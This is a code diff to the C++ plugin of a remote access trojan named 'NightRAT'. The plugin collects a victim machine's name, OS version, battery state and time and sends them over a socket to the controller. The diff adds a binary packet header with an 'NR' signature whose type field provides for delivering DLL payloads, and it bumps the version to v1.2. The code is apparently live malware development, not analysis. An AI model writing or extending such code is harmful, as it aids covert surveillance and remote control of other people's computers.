@@ -7,6 +7,7 @@
 #include <string>
 #include <vector>
 #include <ctime>
+#include <cstdint>
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "IPHLPAPI.lib")
@@ -16,6 +17,14 @@
 
 using json = nlohmann::json;
 using namespace std;
+
+#pragma pack(push, 1)
+struct PacketHeader {
+    uint16_t signature; // 0x524E ('NR')
+    uint8_t  type;      // 0x01: JSON, 0x02: DLL
+    uint32_t size;      // Payload size
+};
+#pragma pack(pop)
 
 // Helper to get registry value
 string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -66,7 +75,7 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     else j["pcname"] = "Unknown";
 
     j["os"]                 = getRegValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
-    j["client"]             = "NightRAT C++ Plugin v1.1";
+    j["client"]             = "NightRAT C++ Plugin v1.2";
     j["process"]            = "client_main.exe";
     j["datetime"]           = string(date_buf);
 
@@ -122,7 +131,15 @@ extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
         j["battery"] = "N/A";
     }
 
-    string msg = j.dump() + "\r\n";
+    string msg = j.dump();
+
+    // Binary Protokol Sarmalama
+    PacketHeader header;
+    header.signature = 0x524E; // 'NR'
+    header.type = 0x01;       // JSON
+    header.size = (uint32_t)msg.length();
+
+    send(sock, (const char*)&header, sizeof(header), 0);
     send(sock, msg.c_str(), (int)msg.length(), 0);
 }
 
